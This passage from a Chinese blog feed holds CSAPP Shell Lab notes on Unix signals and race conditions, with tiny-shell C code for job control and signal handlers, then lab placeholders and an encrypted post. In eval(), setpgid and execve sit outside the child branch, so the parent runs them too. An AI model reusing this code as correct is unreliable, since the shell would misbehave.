这个命令会向<job>代表的工作发送SIGCONT信号并放在前台运行，<job>可以是一个PID也可以是一个JID</li></ul><blockquote><p>信号阻塞：</p><p>执行信号的处理动作成为信号递达（Delivery），信号从产生到递达之间的状态称为信号未决(Pending)。进程可以选择阻塞(Block)某个信号。<br>被阻塞的信号产生时将保持在未决状态，直到进程解除对此信号的阻塞，才执行递达的动作<br>注意：阻塞和忽略是不同的，只要信号被阻塞就不会递达，而忽略是在递达之后可选的一种处理动作<br>信号不会丢失，如果信号被阻塞，只会保持信号未决，但是信号不丢失</p></blockquote><p>对用户输入的参数进行解析并运行计算。书上已经给了 demo，我们优化一下即可。</p><p>有以下几点需要注意：</p><ul><li><code>SIGCHLD</code>信号：只要有一个子进程终止或者停止，内核就会发送一个 <code>SIGHLD</code>信号给父进程。</li><li>信号是不排队的。如果返回信号时，发现目的进程正在执行信号处理，那么该信号则会被阻塞，下一个则会被丢弃。因此，不能用信号来对其他进程中发生的事件计数。</li><li><strong>条件竞争</strong>：条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。本例情况是，如果在<strong>父进程</strong>能够再次运行之前，子进程终止，返回信号，而此时父进程还没执行 <code>addjob</code>，而信号处理回收子进程，执行 <code>deletejob</code>，由于还没添加到列表，所以这个函数什么都做不了，而这结束后父进程又会添加子进程，而产生一个永远不会被删除的job。</li></ul><p>代码参考tshref 源码：</p><p><a href="https://github.com/hestati63/CS230-SP/blob/67bf24d0a7f7b18e1472eaf369c6449dbf7d8d48/Assignment5/tsh.c">https://github.com/hestati63/CS230-SP/blob/67bf24d0a7f7b18e1472eaf369c6449dbf7d8d48/Assignment5/tsh.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXARGS]; <span class="comment">/* Argument list execve() */</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];   <span class="comment">/* Holds modified command line */</span></span><br><span class="line">    <span class="keyword">int</span> bg;              <span class="comment">/* Should the job run in bg or fg? */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;           <span class="comment">/* Process id */</span></span><br><span class="line">    <span class="keyword">int</span> state = UNDEF;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_one, prev_one;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(buf, argv); <span class="comment">//解析命令</span></span><br><span class="line">    <span class="keyword">if</span>(bg == <span class="number">1</span>) &#123; <span class="comment">//判断是否在后台</span></span><br><span class="line">        state = BG;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        state = FG;  </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)  &#123; <span class="keyword">return</span>; &#125;   <span class="comment">/* Ignore empty lines */</span></span><br><span class="line"></span><br><span class="line">    sigfillset(&amp;mask_all); <span class="comment">//防止竞争</span></span><br><span class="line">    sigemptyset(&amp;mask_one);</span><br><span class="line">    sigaddset(&amp;mask_one, SIGCHLD); <span class="comment">// ignore the SIGHLD</span></span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one); <span class="comment">//block SIGHLD and save previous blocked set</span></span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv)) &#123;  <span class="comment">//如果不是内置命令</span></span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">        sigprocmask(SIG_UNBLOCK, &amp;prev_one, <span class="literal">NULL</span>); <span class="comment">//Restore previous blocked set, unblocking SIGHLD</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (setpgid(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123; <span class="comment">// change the group id into pid</span></span><br><span class="line">            perror(<span class="string">&quot;SETPGID ERROR&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">    addjob(jobs, pid, state, cmdline);  <span class="comment">//add job</span></span><br><span class="line">    sigprocmask(SIG_UNBLOCK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(state == FG) &#123; <span class="comment">// if FG wait until finsihed else just print message</span></span><br><span class="line">        waitfg(pid);  <span class="comment">//等待前台程序执行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span>&#123; <span class="comment">// 如果是内置命令则直接执行</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>)) &#123;</span><br><span class="line">        listjobs(jobs); <span class="comment">//print the jobs</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> parsed;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="comment">// case no argument</span></span><br><span class="line">    <span class="keyword">if</span>(!argv[<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// parse argument，其中%开头的数字是JobID，纯数字的是PID</span></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">sscanf</span>(&amp;argv[<span class="number">1</span>][<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>,&amp;parsed))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((job = getjobjid(jobs, parsed)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%%%d: No such job\n&quot;</span>, parsed);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">sscanf</span>(argv[<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>,&amp;parsed))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((job = getjobpid(jobs, parsed)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%d): No such process\n&quot;</span>, parsed);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// make state BG</span></span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        <span class="comment">// send SIGCONT</span></span><br><span class="line">        <span class="keyword">if</span>(kill(-job-&gt;pid, SIGCONT) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill error&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>)) &#123;</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        <span class="comment">// send SIGCONT</span></span><br><span class="line">        <span class="keyword">if</span>(kill(-job-&gt;pid, SIGCONT) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill error&quot;</span>);</span><br><span class="line">        <span class="comment">// wait until finish</span></span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do_bgfg: Internal error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span> </span>&#123; <span class="comment">//等待子进程结束</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line">    <span class="keyword">if</span>(!job) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// while there is no FG process sleep</span></span><br><span class="line">    <span class="keyword">while</span>(job-&gt;state == FG)</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// verbose message</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;waitfg: Process (%d) no longer the fg process\n&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status, jid;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigchld_handler: entering&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// waitpid to find pid</span></span><br><span class="line">    <span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if job deleted </span></span><br><span class="line">        <span class="keyword">if</span>((job = getjobpid(jobs, pid)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Lost track of (%d)\n&quot;</span>, pid);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        jid = job-&gt;jid;</span><br><span class="line">        <span class="comment">// stop signal</span></span><br><span class="line">        <span class="keyword">if</span>(WIFSTOPPED(status))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, jid, job-&gt;pid, WSTOPSIG(status));</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// exit</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(WIFEXITED(status))&#123;</span><br><span class="line">            <span class="keyword">if</span>(deletejob(jobs, pid))</span><br><span class="line">                <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;sigchld_handler: Job [%d] (%d) deleted\n&quot;</span>, jid, pid);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;sigchld_handler: Job [%d] (%d) terminates OK (status %d)\n&quot;</span>, jid, pid, WEXITSTATUS(status));</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// exit by signal</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(deletejob(jobs, pid))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(verbose)</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;sigchld_handler: Job [%d] (%d) deleted\n&quot;</span>, jid, pid);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, jid, pid, WTERMSIG(status));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// end handler</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigchld_handler: exiting&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigint_handler: entering&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if fg exists send SIGINT，// 发送SIGINT给前台进程组里的所有进程，包括子进程。</span></span><br><span class="line">    <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kill(-pid, SIGINT) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill (sigint) error&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;sigint_handler: Job (%d) killed\n&quot;</span>, pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// end handler</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigint_handler: exiting&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigstp_handler: entering&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if fg exists then send SIGSTP to job</span></span><br><span class="line">    <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kill(-pid, SIGTSTP) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill (tstp) error&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;sigstp_handler: Job [%d] (%d) stopped\n&quot;</span>, job-&gt;jid, pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// end handler</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigstp_handler: exiting&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Malloc-Lab"><a href="#Malloc-Lab" class="headerlink" title="Malloc Lab"></a>Malloc Lab</h3><p>先占个坑</p><h3 id="Proxy-Lab"><a href="#Proxy-Lab" class="headerlink" title="Proxy Lab"></a>Proxy Lab</h3><p>+1</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>这是一个笔记</title>
      <link href="posts/17122941/"/>
      <url>posts/17122941/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Here's something encrypted, password is required to continue reading.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="c314b1e2f429cbc14f733158a67b147b6a6e842c23151cf20bd0483b5b62d0b0">23c98bc4e88201af417863563b43fca032f5a6222ede06686b94a7df44e9ad2da3cd47fb7bfbc0a5a0c8396e4760499d82fd9499edb5298ee890d2afb5ef29b7b47e27e62b9addbcffc3381cb7fb3d652ef4bdaf0c891338a231436e0395b192b73df6ad3bc96a03fc0571da5902013455675be28ac39fcd2670b17b8e5d9c3db7d5b4cb2774493599221f233ee72bcc44af197661772dc077c31d56e0ef34fa84ee7133fa7e986c73c934f146360c72396a120d3f60b92942b0ac67dfbe1c4bd7048e32ccd9f6558d2f0e0b376ede37fe5b6ae0ed35a53b9cd1a0922e557f47b81465127945e27d8cc7737272053588f2f1a1df58a9b1573cbded12635b8b7931d686a8468e28cfe9e47d434155bd40ab715aa2aad93e804a8a9470787fab9ff969fcc7f12a9ae41dacbef0670f7839df7f7d7561e1ae79c6449ba3c258df755088a7f3e8e5e35dadb53a8627e0168f5f6fb4321884eaa877b4aace6f39074896ad027404b1cf51f1daa453af9ccd69ba067fcac988cdb8c37b90f614bb35418de96a2f8498e2f64d1f44f18eb4ccca9d686b2cdb73ce8d673073529904b5010b1eb9779c3538cb504618a7c819c9bbd0643bfdc8b8bd6e8ae52e7b2019344ff494584fcbca518cf7207536db50fa53db7bf1f8c144aa89e8175d7b3168bfac5e93a2047797e58f7fadc0afae12ebca91c5015ce956237e5ed9a2092135235f942e47406d4efae63645dcf9e1d2f04882cf88ca09b5f29657ad86cc365b75b7f4068c648ddba38b0aeda33d44b4beb9dfb61e62709f5ad4cee7996702ca6a591fb1e63c802117dbfe507556ec3e0545c63773c856b1161202e98ea9d069020329f9a3d5b2aa36c5bc7266660a23ec468181cf41c696938430c4e143487d314366eb91b725543407a6ee65c51eba78328e96a29655d466fe82a4675b16b419118c9c6586cdc63b3c3f95e38a099a8d209acfd2c532a6a2a541801c830b7ac479c2bf65e1b8e013554f4a6e1f3e23a8d83c2c1e45ee35a28236218674fa5a3845c1b97cf2330a50262a348dbaa2605a910e0918272b07d978ab4e1f8ac891c7dd965425fd4ace58d3f46ca785f38e49aea18e062572b298bb7737e285e9dd553d3ea5a45343fcb587e219e7b7dec2314d5911ba5e039160725eb47029a98e88564c5ad7fb753983b8427f75365133716778ede115efcb9c206846f7547e2e94ce4da602f2686ed3fb0832e74c295bd4b2f1894a620d284c0f415a060d7e31882f7618fa9ed2f9a2818474511a6413e0bbdc2f5a7ff9088e81bb48c54e46b0f1b41f6fd7c466b56b552d723576370b72d56981b13993cc40dff30fc911d711d96dd080dc16966af42e3aaee78ee84b99f181851d2d610cb05c063ce0efd9b95a77b85cd632c2b49968e7d937c4648b2db49d28a358fb9295fe8e56b92657f756459eda15501ced7ba731763220aab5d63df2bf0cff6b3008be0cf0d8680e7727566aabea8d61126ddef693f7ccde895740338acb91478c41651d854c956b519da17d7affbc0ffdaa3b65a437af6217e7560747912e51f63997e87fbd87650326695d02b003de06405f97c9ef8539e265ba06bf780c1ec433a2d84272cae8c00c46cc2126f6b02287c1f30f86c10e198c8d28ba04970b51a5001d5e51fc01f90e25ba43c6a29f34900c2d78b485eba631e286c3e6043f936eaa12b51d72bd2de0822fbe3669ff57c2c4ba3e16fda2ec1a2009867aa57f42e2a723e561912e916f5e7c9ab05e66367ec1242cb3f1b2a66fa2fb687ac0a0ddb5d4b64aa33ab60c877633d8a28102479a0f4111dadf0be93ac543fea07c920587a2fea470ebc23b9d9ffae34604a8ed0ce6976112eda9aed69d180f86957d9fde53dfcc402df2fd2956505a7cb585e07f2815edaf0ec30376538d0a34cea5cceb23896dfd792719ed871690e036ee77b13ae38f205b1f2007cf045ca2ced294bcc1c107114e140fca4968979f548a6c28449191364fbeee89c903ec31a54021c11ec040da26861d3ff52e9cf7130dc68ffc75a4735d838550fcd86da6dd95a6e2b241f876071bac8426e35a67b6e258c9ef98ccfc7dd7c0cbfeece9a04d1e61cbf895b3dfc049c5662dfd9209440a7f47f4a02df8ce700a72040f5b4859cb83190d8ba67263d3b8e5d5c798df559f00193e95ea83af2aa5c3d2466169e26bdb4f1088cabe5aa8835e8b2165cdddb7fe412887265ea7d0ba2c8b027a21e585e698025eed14c72c3b1df7b24a46c905d78e02b9be447b8b5cbbbbc6c9eaea17f3b4e4454fe4f7989c9e48f2a9f1e14dbcfb2729c235b25a8d195a817333b94eace9354196b0a7d3f538970ca964627b3004b26f86c4d8e4adfff36e1eda4bfe7cf83fb72292f043c3f78fec3a5789623c6dc34298eed77dc502ee5b538b3d34ece4dbae2703a4fc1bef2abd3fae5ef9feafd8459e991074d38092f44986f2ea8fe17fc1f7015e8e9e96e223d562acb642fdf43c34a3bf2785125d6e0fd530c0af42b5e81084d26f45543e870ff6e03eb5d29b7f4892fa45116b871874985d583fad928a5e360059df198928d6503db8bb37a470604638aa24b19d7e3e6c9379b03e6392126a71e642e415068486f8876b43d81c05cd4ac1ad9d0b